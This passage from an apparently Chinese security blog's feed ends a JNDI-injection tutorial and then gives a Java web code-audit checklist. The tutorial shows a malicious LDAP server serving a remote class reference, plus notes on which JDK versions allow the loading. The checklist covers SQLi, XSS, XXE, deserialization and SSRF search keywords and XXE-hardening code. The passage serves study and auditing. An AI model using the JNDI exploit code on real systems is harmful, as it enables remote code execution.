class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:8111/Evil&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617223744211-553424588.png" alt="image-20220617223742062"></p><h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><h4 id="RMI版本限制"><a href="#RMI版本限制" class="headerlink" title="RMI版本限制"></a>RMI版本限制</h4><p>这里还需要说下在 当RMI客户端引用远程对象将受本地Java环境限制，即本地的<code>java.rmi.server.useCodebaseOnly</code>配置必须为<code>false</code>(允许加载远程对象)，如果该值为true则禁止引用远程对象。</p><p>所以这里如果我们进行利用的话，客户端的RMI启动的时候就需要设置<code>useCodebaseOnly</code></p><p>java在6u45、7u21开始<code>java.rmi.server.useCodebaseOnly</code>默认配置已经改为了<code>true</code>。</p><p>在javasec中看到说是8u121开始<code>java.rmi.server.useCodebaseOnly</code>默认配置已经改为了<code>true</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617180421366-1985012742.png" alt="image-20220617180420743"></p><p>除此之外被引用的<code>ObjectFactory</code>对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为false(不信任远程引用对象)则无法调用远程的引用对象。</p><p>rmi的jndi在6u132，7u122，8u113 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值已改为了false。</p><p>如果想要通过rmi的jndi进行加载恶意类，在jdk8中，版本就可以适用到113。</p><p>如下为jdk8u321的测试结果：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617182734589-490760347.png" alt="image-20220617182734089"></p><h4 id="LDAP版本限制"><a href="#LDAP版本限制" class="headerlink" title="LDAP版本限制"></a>LDAP版本限制</h4><p>然后再说下ldap的jndi，ldap的jndi在6u211、7u201、8u191、11.0.1后也将默认的<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为了false。</p><p>这里就是为什么进行JNDI注入的时候用LDAP会通用，因为我们如果想要通过ldap的jndi进行加载恶意类，在jdk8中，版本就可以适用到8u191</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617181311638-1405806032.png" alt="image-20220617181311507"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/rfrder/article/details/120048519">https://blog.csdn.net/rfrder/article/details/120048519</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13958047.html">https://www.cnblogs.com/nice0e3/p/13958047.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;JNDI注入是反序列化漏洞常用的攻击手法之一。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="https://kpa1on.github.io/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb代码审计CheckList</title>
    <link href="https://kpa1on.github.io/2022/06/16/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1CheckList/"/>
    <id>https://kpa1on.github.io/2022/06/16/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1CheckList/</id>
    <published>2022-06-16T15:30:37.000Z</published>
    <updated>2022-08-07T12:47:08.940Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>整理下平时Java代码审计中常见的一些漏洞学习总结以及一些审计思路，后续会不断补充。</p><span id="more"></span><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>以下为常用的工具清单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">一、代码编辑器：</span><br><span class="line">1.Jetbrains IDEA(IDE)</span><br><span class="line">2.Sublime text(文本编辑器)</span><br><span class="line">3.Eclipse</span><br><span class="line">二、测试工具：</span><br><span class="line">1.Burp Suite：是渗透测试工作者必备的一款工具，同时对于代码审计者和安全研究人员来说，这也是一款比较重要的测试工具，其跨平台、便捷、强大的功能以及丰富的插件，深受信息安全从业者的喜爱。</span><br><span class="line">2.SwitchyOmega：SwitchyOmega 是一款代理管理插件，支持Firefox和Chrome浏览器，并支持HTTP、HTTPS、socket4和socket5协议。</span><br><span class="line">3.Max HackerBar：HackBar是Firefox的一个插件，也是信息安全从业者常用的经典工具。</span><br><span class="line">4.Postman：Postman是一款功能强大的网页调试工具，能够为用户提供强大的Web API &amp; HTTP请求调试功能。</span><br><span class="line">5.Ysoserial：是一款开源的Java反序列化测试工具，内部集成有多种利用链，可以快速生成用于攻击的代码，也可以将新公开的反序列化漏洞利用方式自行加入Ysoserial中。</span><br><span class="line">6.Marshalsec：是一款开源的Java反序列化测试工具，不仅可以生成各类反序列化利用链，还可以快速启动恶意的RMI服务等。</span><br><span class="line">7.MySQL Monitor：是Web版本的SQL记录实时监控工具。</span><br><span class="line">8.Beyond Compare：是一款文件比较工具，主要对比两个文件夹或者文件，并以颜色标示差异，比较范围包括目录、文档内容等。使用该工具可以方便代码审计人员快速地比对两个版本代码的差别。</span><br><span class="line">三、反编译工具</span><br><span class="line">1.JD-GUI：是一款具有UI界面的反编译工具，界面简洁大方，使用简单方便。</span><br><span class="line">2.Fernflower：功能比JD-GUI更强大，虽然没有UI界面，但可以配合系统指令完成批量反编译的工作。</span><br><span class="line">3.CFR：功能强大的反编译工具，支持主流Java特性——Java 8 lambda表达式，以及Java 7字符串切换。在某些JD-GUI无法反编译的情况下，CFR仍然能完美地进行反编译，也可以像FernFlower那样配合系统指令进行批量反编译。</span><br><span class="line">4.IntelliJ IDEA：具能够自动解包已添加依赖的Jar包，并对其内容进行反编译。该工具拥有强大的动态调试和字符串匹配和搜索功能，为审计和调试漏洞的工作提供了极大便利。</span><br><span class="line">5.CodeReviewTools：是一款可以快速搜索代码中的关键点，一键对jar进行批量反编译，也支持直接对war包进行操作。</span><br><span class="line">四、Java代码静态扫描工具</span><br><span class="line">1.Fortify SCA：获得业界认可的静态代码检查工具，但它是收费的。Fortify SCA的核心在于规则库，用户可以自定义规则库，减少误报。</span><br><span class="line">2.VCG：基于 VB 开发的一款Windows下的白盒审计工具。VCG 支持多种语言，例如C/C++、Java、C#、VB、PL/SQL、PHP。VCG会根据代码中的变量名等信息动态生成针对该代码的漏洞规则，通过正则检查是否有和漏洞规则所匹配的代码。</span><br><span class="line">3.FindBugs与FindSecBugs插件：FindBugs是一款Bug扫描插件，在IDEA和Eclipse中都可进行安装。FindBugs可以帮助开发人员发现代码缺陷，减少Bug，但其本身并不具备发现安全漏洞的能力，需要安装FindSecBugs拓展发现安全漏洞的能力。</span><br><span class="line">4.SpotBugs：是FindBugs的继任者，所以二者用法基本一样，可以独立使用，也可以作为插件使用。</span><br><span class="line">5.CheckMark：白盒代码审计解决方案，主要通过采用独特的词汇分析技术和CxQL专利查询技术对应用程序源码进行静态分析检查。</span><br><span class="line">6.Snyk插件：修复项目中的安全漏洞、基础架构错误配置和代码质量问题。</span><br><span class="line">7.Sensei插件：可在键入时扫描和修复易受攻击的代码 - 具有数百个可下载的安全编码配方（规则）以及内置的自行制作能力。</span><br><span class="line">8.Reshift Security插件：可以快速发现漏洞，提供多个代码修复片段，以及丰富的文档，涵盖了每个漏洞的检测、修复和测试。</span><br><span class="line">9.MurphySec Code Scan插件：可以快速识别您的项目中使用了哪些存在安全缺陷的开源组件，并帮助您一键修复问题。</span><br><span class="line">10.Momo Code Sec Inspector插件：重于在编码过程中发现项目潜在的安全风险，并提供一键修复能力。</span><br><span class="line">11.dependence-check：可用于检查已发布安全漏洞的项目依赖项。</span><br><span class="line">12.wJa：一款结合DAST、SAST、IAST的综合性应用程序安全分析工具，支持对java web程序的安全性进行分析，含有反编译，代码审计，调试jar包，代理追踪等用于分析软件安全的功能。</span><br><span class="line">13.tabby：是一款针对Java语言的静态代码分析工具，它使用静态分析框架 Soot 作为语义提取工具，将JAR/WAR/CLASS文件转化为代码属性图，并使用 Neo4j 图数据库来存储生成的代码属性图CPG。</span><br><span class="line">14.SpringInspector：Java自动代码审计工具，尤其针对Spring框架，提供一个SpringBoot的Jar包即可进行自动代码审计，底层技术基于字节码分析。</span><br><span class="line">15.gadgetinspector：反序列化漏洞利用链、漏洞检测工具。</span><br></pre></td></tr></table></figure><h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>审计的注意点</p><ul><li>是否使用预编译技术，预编译是否完整。</li><li>定位SQL语句上下文，查看是否有参数直接拼接，是否有对模糊查询关键字的过滤。</li><li>Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询、order by排序、范围查询in、动态表名&#x2F;列名，只能拼接，所以还是需要手工防注入，此时可查看相关逻辑是否正确。</li><li>JPA搜索<code>JpaSort.unsafe()</code>，查看是否用实体之外的字段对查询结果排序，进行了SQL的拼接。以及查看<code>EntityManager</code>的使用，也可能存在拼接SQL的情况。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Statement</span><br><span class="line">createStatement</span><br><span class="line">PrepareStatement</span><br><span class="line">like <span class="string">&#x27;%$&#123;</span></span><br><span class="line"><span class="string">in($&#123;</span></span><br><span class="line"><span class="string">in ($&#123;</span></span><br><span class="line"><span class="string">select</span></span><br><span class="line"><span class="string">update</span></span><br><span class="line"><span class="string">insert</span></span><br><span class="line"><span class="string">delete</span></span><br><span class="line"><span class="string">$&#123;</span></span><br><span class="line"><span class="string">setObject(</span></span><br><span class="line"><span class="string">setInt(</span></span><br><span class="line"><span class="string">setString(</span></span><br><span class="line"><span class="string">setSQLXML(</span></span><br><span class="line"><span class="string">createQuery(</span></span><br><span class="line"><span class="string">createSQLQuery(</span></span><br><span class="line"><span class="string">createNativeQuery(</span></span><br></pre></td></tr></table></figure><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>审计的注意点</p><ul><li>定位用户的输入输出，梳理数据交互以及前端展示的过程</li><li>找到一条完整的利用链之后，就是结合现有的安全措施（输出编码、过滤器等）进行判断，例如是否存在绕过的可能，或者是没有任何安全防护可直接造成攻击。</li><li>扫描所有的 HttpServletRequest 查看相关的上下文环境。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">request.getParamter</span><br><span class="line">&lt;%=</span><br><span class="line">param</span><br><span class="line">$&#123;</span><br><span class="line">&lt;c:out</span><br><span class="line">&lt;c:<span class="keyword">if</span></span><br><span class="line">&lt;c:forEach</span><br><span class="line">ModelAndView</span><br><span class="line">ModeMap</span><br><span class="line">Model</span><br><span class="line">request.setAttribute</span><br><span class="line">response.getWrite().print(</span><br><span class="line">response.getWrite().writer(</span><br><span class="line">XssFilter</span><br><span class="line">org.springframework.web.util.HtmlUtils</span><br><span class="line">org.apache.commons.lang3.StringEscapeUtils</span><br><span class="line">ESAPI.encoder().encodeForHTML</span><br></pre></td></tr></table></figure><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>审计的注意点</p><ul><li><p>XML 解析一般在导入配置、数据传输接口等场景可能会用到，涉及到 XML 文件处理的场景可留意下 XML 解析器是否禁用外部实体，从而判断是否存在 XXE。</p></li><li><p>XML解析涉及的业务功能点： WebServices接口、RESTful接口、Excel文件解析、Soap协议等。</p></li><li><p>计XML解析器是否设置了相关的安全属性，禁用DTDs或者禁止使用外部实体。还有是否使用了不安全的漏洞组件。</p></li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.DocumentBuilderFactory</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">javax.xml.stream.XMLInputFactory</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">org.jdom.output.XMLOutputter</span><br><span class="line">oracle.xml.parser.v2.XMLParser</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">org.dom4j.io.SAXReader </span><br><span class="line">org.dom4j.DocumentHelper</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">javax.xml.transform.sax.SAXSource </span><br><span class="line">javax.xml.transform.TransformerFactory </span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory </span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XPathExpression</span><br><span class="line">java.beans.XMLDecoder</span><br></pre></td></tr></table></figure><p>部分XML解析器的正确禁用方式，参考：<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">XMLInputFactory (a StAX parser)</span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="literal">false</span>); <span class="comment">// This disables DTDs entirely for that </span></span><br><span class="line">factory</span><br><span class="line">xmlInputFactory.setProperty(<span class="string">&quot;javax.xml.stream.isSupportingExternalEntities&quot;</span>, <span class="literal">false</span>); <span class="comment">// disable external entities</span></span><br><span class="line"></span><br><span class="line">TransformerFactory</span><br><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">Validator</span><br><span class="line"><span class="type">SchemaFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SchemaFactory.newInstance(<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>);</span><br><span class="line"><span class="type">Schema</span> <span class="variable">schema</span> <span class="operator">=</span> factory.newSchema();</span><br><span class="line"><span class="type">Validator</span> <span class="variable">validator</span> <span class="operator">=</span> schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">SchemaFactory</span><br><span class="line"><span class="type">SchemaFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SchemaFactory.newInstance(<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">Schema</span> <span class="variable">schema</span> <span class="operator">=</span> factory.newSchema(Source);</span><br><span class="line"></span><br><span class="line">SAXTransformerFactory</span><br><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.newXMLFilter(Source);</span><br><span class="line"><span class="comment">//Note: Use of the following XMLConstants requires JAXP 1.5, which was added to Java in 7u40 and Java 8:</span></span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD</span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA</span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET</span><br><span class="line"></span><br><span class="line">XMLReader</span><br><span class="line"><span class="type">XMLReader</span> <span class="variable">reader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>); <span class="comment">// This may </span></span><br><span class="line">not be strictly required as DTDs shouldn<span class="string">&#x27;t be allowed at all, per previous line.</span></span><br><span class="line"><span class="string">15 / 28</span></span><br><span class="line"><span class="string">reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="string">reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SAXReader</span></span><br><span class="line"><span class="string">saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span></span><br><span class="line"><span class="string">saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="string">saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="string">//Based on testing, if you are missing one of these, you can still be vulnerable to an XXE attack.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SAXBuilder</span></span><br><span class="line"><span class="string">SAXBuilder builder = new SAXBuilder();</span></span><br><span class="line"><span class="string">builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span></span><br><span class="line"><span class="string">builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="string">builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="string">Document doc = builder.build(new File(fileName));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unmarshaller</span></span><br><span class="line"><span class="string">SAXParserFactory spf = SAXParserFactory.newInstance();</span></span><br><span class="line"><span class="string">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="string">spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="string">spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span></span><br><span class="line"><span class="string">Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(new StringReader(xml)));</span></span><br><span class="line"><span class="string">JAXBContext jc = JAXBContext.newInstance(Object.class);</span></span><br><span class="line"><span class="string">Unmarshaller um = jc.createUnmarshaller();</span></span><br><span class="line"><span class="string">um.unmarshal(xmlSource);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">XPathExpression</span></span><br><span class="line"><span class="string">DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();</span></span><br><span class="line"><span class="string">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); </span></span><br><span class="line"><span class="string">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); </span></span><br><span class="line"><span class="string">DocumentBuilder builder = df.newDocumentBuilder();</span></span><br><span class="line"><span class="string">String result = new XPathExpression().evaluate( builder.parse(new </span></span><br><span class="line"><span class="string">ByteArrayInputStream(xml.getBytes())) );</span></span><br></pre></td></tr></table></figure><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>审计的注意点</p><ul><li>反序列化操作的功能位置：导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘或DB存储等业务场景。</li><li>可以通过对网络抓包寻找序列化数据：java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。</li><li>查看反序列化触发点的参数是否由用户可控。</li><li>全局查找implements Serializable 的所有内部类。</li><li>程序中存在一条可以产生安全问题的利用链，如远程代码执行，并找到一个可以触发利用链的点。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>审计的注意点</p><ul><li>重点关注能执行命令的一些功能及函数</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec()</span><br><span class="line">Process</span><br><span class="line">UNIXProcess</span><br><span class="line">ProcessImpl</span><br><span class="line">ProcessBuilder.start()</span><br><span class="line">GroovyShell.evaluate()</span><br><span class="line">由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line">由java一些脚本语言引起的 RCE 漏洞，常见的如：Groovy、JavascriptEngine等</span><br><span class="line">由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic等</span><br></pre></td></tr></table></figure><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>审计的注意点</p><ul><li>SSRF 漏洞出现的场景有很多，如在线翻译、转码服务、图片收藏&#x2F;下载、信息采集、邮件系统或者从远程服务器请求资源等。通常我们可 以通过浏览器查看源代码查找是否在本地进行了请求，也可以使用 DNSLog 等工具进行测试网页是否被访问。</li><li>重点关注HTTP请求操作函数。</li><li>想要支持所有的协议，只能使用URLConnection、URL。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute()</span><br><span class="line">HttpClient.executeMethod()</span><br><span class="line">HttpURLConnection.connect()</span><br><span class="line">HttpURLConnection.getInputStream()</span><br><span class="line">URL.openStream()</span><br><span class="line">HttpServletRequest()</span><br><span class="line">BasicHttpEntityEnclosingRequest()</span><br><span class="line">DefaultBHttpClientConnection()</span><br><span class="line">BasicHttpRequest()</span><br><span class="line">ImageIO.read()</span><br><span class="line">Request.Get.execute</span><br><span class="line">Request.Post.execute</span><br><span class="line">OkHttpClient.newCall.execute</span><br><span class="line">com.alibaba.druid.util.HttpClientUtils</span><br><span class="line">javax.servlet.http.HttpServletRequest</span><br><span class="line">java.net.URI</span><br><span class="line">java.net.URL</span><br><span class="line">java.net.URLConnection</span><br><span class="line">com.bea.uddiexplorer.Search</span><br><span class="line">org.apache.commons.httpclient.HttpMethodBase</span><br><span 